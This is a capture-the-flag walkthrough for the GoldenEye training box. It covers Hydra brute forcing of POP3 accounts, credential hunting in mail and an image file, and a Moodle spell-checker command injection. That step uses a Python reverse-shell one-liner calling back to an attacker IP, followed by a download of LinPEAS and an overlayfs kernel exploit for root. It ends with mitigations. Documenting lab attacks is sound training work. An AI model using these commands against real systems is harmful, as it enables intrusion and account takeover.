# GoldenEye CTF Walkthrough

**Target:** GoldenEye  
**Source:** [TryHackMe](https://tryhackme.com/room/goldeneye)  
**Difficulty:** Medium  
**Target IP:** 10.113.190.100

## Table of Contents
- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [Web Enumeration](#web-enumeration)
- [POP3 Brute Force & Mail Enumeration](#pop3-brute-force--mail-enumeration)
- [Moodle Access & RCE](#moodle-access--rce)
- [Privilege Escalation](#privilege-escalation)
- [Flags](#flags)
- [Vulnerabilities](#vulnerabilities)

---

## Overview

GoldenEye is a medium-difficulty, James Bond themed Linux box. The attack chain
covers web source enumeration to recover a first credential, POP3 brute forcing
with Hydra to pivot across mail accounts, mail enumeration to harvest further
users and a Moodle URL, an authenticated Moodle spell-checker RCE for a foothold
as `www-data`, and finally a kernel `overlayfs` exploit for root.

**Key Skills Required:**
- Network scanning and service enumeration
- Web source review and HTML-entity decoding
- POP3 (plain and SSL) interaction via telnet/openssl
- Credential brute forcing with Hydra
- Moodle administration abuse (Aspell / PSpellShell RCE)
- Linux kernel privilege escalation (overlayfs, CVE-2015-1328)

---

## Reconnaissance

### Network Scanning

```bash
nmap -sV -sC -p- 10.113.190.100
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 25/tcp | smtp | Postfix smtpd |
| 80/tcp | http | Apache httpd 2.4.7 (Ubuntu) |
| 55006/tcp | ssl/pop3 | Dovecot pop3d |
| 55007/tcp | pop3 | Dovecot pop3d |

The HTTP title is `GoldenEye Primary Admin Server`. POP3 is deliberately moved to
high non-default ports (55006 = POP3S, 55007 = POP3 with STLS).

**Ports open:** `4`

> **Q1 — How many ports are open?** → `4`

---

## Web Enumeration

### Landing Page & Hidden Login

Browsing `http://10.113.190.100/` loads a typewriter banner driven by
`terminal.js`. The `/sev-home/` directory is referenced as the login location
but is protected by HTTP Basic Auth (401 Unauthorized).

```bash
curl http://10.113.190.100/
curl http://10.113.190.100/sev-home/      # 401 Unauthorized
```

### Reviewing terminal.js

```bash
curl http://10.113.190.100/terminal.js
```

The script contains commented-out hints:

```
//Boris, make sure you update your default password.
//I encoded you p@ssword below...
//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
//BTW Natalya says she can break your codes
```

The username is **Boris** and the password is HTML-entity encoded. Decoding the
entities (e.g. `&#73;` = `I`, `&#110;` = `n`, ...) yields:

```
InvincibleHack3r
```

> **Q2 — Who needs to update their default password?** → `Boris`  
> **Q3 — What's their password?** → `InvincibleHack3r`

### Accessing /sev-home/

```bash
curl -u boris:InvincibleHack3r http://10.113.190.100/sev-home/
```

The authenticated page reveals an HTML comment listing GNO supervisors and a
reminder that the POP3 service runs on a high non-default port:

```
Qualified GoldenEye Network Operator Supervisors:
Natalya
Boris
```

---

## POP3 Brute Force & Mail Enumeration

### Confirming the POP3 Service

```bash
telnet 10.113.190.100 55007
+OK GoldenEye POP3 Electronic-Mail System
```

> **Q5 — What service is configured on port 55007?** → `pop3`

### Brute Forcing Boris with Hydra

The known web credential does not work over POP3, so Hydra is used with the
fasttrack wordlist:

```bash
hydra -l boris -P /usr/share/wordlists/fasttrack.txt -f pop3s://10.113.190.100:55006
```

```
[55006][pop3] host: 10.113.190.100   login: boris   password: secret1!
```

> **Q4 — New password found via Hydra?** → `secret1!`

### Reading Boris' Mailbox

```bash
telnet 10.113.190.100 55007
USER boris
PASS secret1!
LIST          # 3 messages
RETR 1        # admin intro
RETR 2        # "Boris, I can break your codes!" — from natalya@ubuntu
RETR 3        # from alec@janus.boss — mentions Xenia + hidden access codes in root dir
```

> **Q6 — What can you find on this service?** → `emails`  
> **Q7 — Which user can break Boris' codes?** → `Natalya`

### Building a User List and Brute Forcing Again

The mails reveal `natalya` and `xenia` as additional users. Build a list (use
`printf` so the newlines are written literally — plain `echo "a\nb"` writes the
literal `\n` in bash):

```bash
printf "natalya\nroot\nxenia\n" > usernames.txt
hydra -L usernames.txt -P /usr/share/wordlists/fasttrack.txt -f pop3s://10.113.190.100:55006
```

```
[55006][pop3] host: 10.113.190.100   login: natalya   password: bird
```

### Reading Natalya's Mailbox

```bash
telnet 10.113.190.100 55007
USER natalya
PASS bird
LIST          # 2 messages
RETR 1        # warning about the Janus syndicate
RETR 2        # contains Xenia's creds + the internal training URL
```

Natalya's second mail reveals:

```
username: xenia
password: RCP90rulez!

Internal Domain: severnaya-station.com/gnocertdir
Point this server's IP to severnaya-station.com in /etc/hosts.
```

Add the host entry:

```bash
echo "10.113.190.100 severnaya-station.com" | sudo tee -a /etc/hosts
```

---

## Moodle Access & RCE

### Logging in as Xenia

Browse to `http://severnaya-station.com/gnocertdir/` — this is a **Moodle**
instance. Log in as:

```
xenia : RCP90rulez!
```

### Enumerating Doak

Xenia's Moodle profile / messages point to another student account, **Doak**.
Doak's POP3 mailbox can be brute forced the same way:

```bash
hydra -l doak -P /usr/share/wordlists/fasttrack.txt -f pop3s://10.113.190.100:55006
```

```
[55006][pop3] host: 10.113.190.100   login: doak   password: goat
```

Read Doak's mail to recover his Moodle credentials:

```bash
telnet 10.113.190.100 55007
USER doak
PASS goat
LIST
RETR 1        # Doak's note to himself with the Moodle login below
```

```
username: dr_doak
password: 4England!
```

### Finding the Admin Password

Logging into Moodle as `dr_doak : 4England!` and reviewing Doak's private files
reveals an image attachment (`for-007.jpg`). Pulling the metadata/strings from
that file exposes a base64 string:

```bash
strings for-007.jpg          # reveals: eFdpbnRlcjE5OTV4IQ==
echo "eFdpbnRlcjE5OTV4IQ==" | base64 -d
xWinter1995x!
```

This is the **admin** password for the Moodle site (admin user is the site
administrator account).

### Authenticated Moodle Spell-Checker RCE

This Moodle version is vulnerable to a command-injection RCE through the Aspell
spell-checker path (related to **CVE-2013-3630** — the MNet/Spell-checker
command-execution class of Moodle bugs). After logging in as admin:

1. Start a listener on the attacker box:

   ```bash
   rlwrap nc -nvlp 4444
   ```

2. Set the spell-checker path under
   **Site Administration → Server → System Paths** to a payload that calls a
   reverse shell. Use **straight quotes** (curly/smart quotes break the
   payload):

   ```bash
   python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.255.55",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
   ```

   Replace `192.168.255.55` with your own tun0/VPN IP.

3. Set the spell engine to **PSpellShell** under
   **Site Administration → Plugins → Text Editors → TinyMCE HTML Editor**.

4. Trigger it: create a new blog post / forum entry and click the
   **spell-checker** button. The payload executes and a shell returns to the
   listener.

### Stabilising the Shell

```bash
whoami
www-data
python -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Privilege Escalation

### Enumeration with LinPEAS

Serve LinPEAS from the attacker machine:

```bash
python3 -m http.server 8080
```

On the target (note the `:8080` port — it must match the server above):

```bash
cd /tmp
curl 192.168.255.55:8080/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

LinPEAS flags an outdated, vulnerable kernel:

```
Kernel version: 3.13.0-32-generic
```

### Finding the Kernel Exploit

```bash
searchsploit ubuntu 3.13
```

```
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Priv Esc | linux/local/37292.c
```

```bash
cp /usr/share/exploitdb/exploits/linux/local/37292.c exploit.c
```

### Compiling on the Target

`gcc` is **not** installed on the target, but the traditional UNIX compiler `cc`
is. Edit the embedded compiler call inside the exploit so it uses `cc`:

```c
lib=system("cc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
```

Transfer the exploit (via the same Python HTTP server), then compile and run:

```bash
cc exploit.c -o root
./root
```

```bash
whoami
root
```

---

## Flags

### Root Flag

```bash
cd /root
cat flag.txt
```

> ```
> Alec told me to place the codes here:
>
> 568628e0d993b1973adc718237da6e93
>
> If you captured this make sure to go here.....
> /006-final/xvf7-flag/
> ```

**Root flag:** `568628e0d993b1973adc718237da6e93`

The trailing `/006-final/xvf7-flag/` is the room's "you win" easter-egg page —
browse to `http://severnaya-station.com/006-final/xvf7-flag/` to finish the
GoldenEye storyline.

---

## Flags Summary

| Flag | Value | Location |
|------|-------|----------|
| Root Flag | `568628e0d993b1973adc718237da6e93` | `/root/flag.txt` |

---

## Vulnerabilities

### 1. Credentials Exposed in Client-Side Source (High)

**Description:** `terminal.js` contained a username (`Boris`) and an
HTML-entity-encoded password (`InvincibleHack3r`) directly in source served to
every visitor.

**Impact:** Recovery of the first valid credential with no authentication.

**Mitigation:**
- Never embed secrets in client-side code or comments.
- Enforce password rotation away from defaults.

### 2. Weak Credentials / No Brute-Force Protection on POP3 (High)

**Description:** POP3 accounts (`boris:secret1!`, `natalya:bird`, `doak:goat`)
used trivial passwords present in the fasttrack wordlist, and the Dovecot
service applied no lockout or rate limiting.

**Impact:** Hydra recovered multiple account passwords, enabling lateral
movement through mailboxes.

**Mitigation:**
- Enforce strong password policies.
- Apply fail2ban / connection rate limiting to mail services.

### 3. Sensitive Data in Mailboxes and Image Metadata (Medium)

**Description:** Plaintext credentials and the internal Moodle URL were stored in
emails, and the Moodle admin password (`xWinter1995x!`, base64
`eFdpbnRlcjE5OTV4IQ==`) was hidden inside an image file (`for-007.jpg`).

**Impact:** Chained credential discovery leading to Moodle admin access.

**Mitigation:**
- Do not transmit or store credentials in cleartext.
- Strip metadata from uploaded files; treat user-controlled uploads as untrusted.

### 4. Moodle Spell-Checker Command Injection (Critical)

**CVE:** CVE-2013-3630 (Moodle Aspell/PSpellShell command execution class)

**Description:** An authenticated administrator can set the system spell-checker
path/engine to attacker-controlled input that is passed to a shell, yielding
remote code execution as `www-data`.

**Impact:** Initial foothold on the host.

**Mitigation:**
- Upgrade Moodle to a patched release.
- Restrict who can modify system paths; run the web service with least privilege.

### 5. Outdated, Vulnerable Kernel (Critical)

**CVE:** CVE-2015-1328 (overlayfs local privilege escalation)

**Description:** The target ran kernel `3.13.0-32-generic`, vulnerable to the
overlayfs privilege-escalation exploit (37292.c).

**Impact:** Full privilege escalation from `www-data` to `root`.

**Mitigation:**
- Keep the kernel patched and current.
- Remove build tools (`cc`/`gcc`) from production hosts to raise the bar for
  on-target compilation.

---

## Attack Chain Summary

```
Nmap scan → 4 open ports (SMTP, HTTP, POP3S x2)
    ↓
Web source (terminal.js) → boris : InvincibleHack3r (HTML-entity decoded)
    ↓
/sev-home/ → confirms users Natalya & Boris, POP3 hint
    ↓
Hydra (POP3S) → boris : secret1!
    ↓
Boris' mail → users natalya, xenia + Janus syndicate intel
    ↓
Hydra (POP3S) → natalya : bird
    ↓
Natalya's mail → xenia : RCP90rulez! + severnaya-station.com/gnocertdir
    ↓
/etc/hosts edit → Moodle login as xenia
    ↓
Enumerate Doak → Hydra doak : goat → Doak's mail → dr_doak : 4England!
    ↓
for-007.jpg strings → base64 → admin : xWinter1995x!
    ↓
Moodle Aspell/PSpellShell RCE → reverse shell as www-data
    ↓
LinPEAS → kernel 3.13.0-32 vulnerable
    ↓
searchsploit → overlayfs 37292.c (compile with cc, not gcc)
    ↓
./root → root shell
    ↓
Root flag captured → 568628e0d993b1973adc718237da6e93
    ↓
Complete system compromise
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service/version detection |
| curl | Web source review, authenticated requests |
| telnet / openssl s_client | Manual POP3 interaction |
| Hydra | POP3/POP3S credential brute forcing |
| base64 / strings | Decoding hidden credentials |
| Moodle (Aspell/PSpellShell) | Authenticated RCE foothold |
| Netcat (rlwrap nc) | Reverse-shell listener |
| LinPEAS | Privilege-escalation enumeration |
| searchsploit / cc | Kernel exploit discovery and on-target compilation |

---

## References

- [TryHackMe — GoldenEye](https://tryhackme.com/room/goldeneye)
- [CVE-2015-1328 — overlayfs LPE](https://www.cve.org/CVERecord?id=CVE-2015-1328)
- [CVE-2013-3630 — Moodle spell-checker command execution](https://www.cve.org/CVERecord?id=CVE-2013-3630)
- [ExploitDB 37292 — overlayfs](https://www.exploit-db.com/exploits/37292)
- [Nmap](https://nmap.org/)

---
